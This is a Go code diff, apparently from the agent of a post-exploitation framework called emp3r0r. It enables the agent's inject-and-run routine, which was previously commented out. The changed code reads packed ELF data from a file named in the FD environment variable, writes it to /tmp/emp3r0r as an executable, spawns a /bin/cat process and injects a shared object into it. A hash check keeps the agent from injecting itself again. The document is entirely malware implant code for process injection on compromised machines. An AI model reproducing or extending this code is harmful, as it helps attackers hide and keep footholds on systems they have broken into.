@@ -38,11 +38,10 @@ func main() {
 	flag.Parse()
 
 	// inject
-	// disabled for now, will re-enable when it's usable
-	// err = inject_and_run()
-	// if err != nil {
-	// 	log.Print(err)
-	// }
+	err = inject_and_run()
+	if err != nil {
+		log.Print(err)
+	}
 
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
@@ -405,18 +404,32 @@ func inject_and_run() (err error) {
 	if path_hash == "f74980d53e01a9ca2078f3894390606d4ecc1b0fc70d284faa16043d718ad0a5" {
 		return fmt.Errorf("This process is started by injector, aborting")
 	}
-	cmd := exec.Command("/bin/cat")
-	err = cmd.Run()
-	if err != nil {
-		return
+
+	// read envv
+	fd := os.Getenv("FD")
+	if fd == "" {
+		return fmt.Errorf("FD empty")
 	}
-	go func(e error) {
-		for cmd.Process != nil {
-			agent.CopySelfTo("/tmp/emp3r0r")
-			e = agent.InjectSO(cmd.Process.Pid)
-			break
+	packed_elf_data, err := ioutil.ReadFile(fd)
+	if err != nil {
+		return fmt.Errorf("read %s: %v", fd, err)
+	} else {
+		cmd := exec.Command("/bin/cat")
+		err = cmd.Run()
+		if err != nil {
+			return
 		}
-	}(err)
+		go func(e error) {
+			for cmd.Process != nil {
+				e = ioutil.WriteFile("/tmp/emp3r0r", packed_elf_data, 0755)
+				if e != nil {
+					break
+				}
+				e = agent.InjectSO(cmd.Process.Pid)
+				break
+			}
+		}(err)
+	}
 
 	return
 }
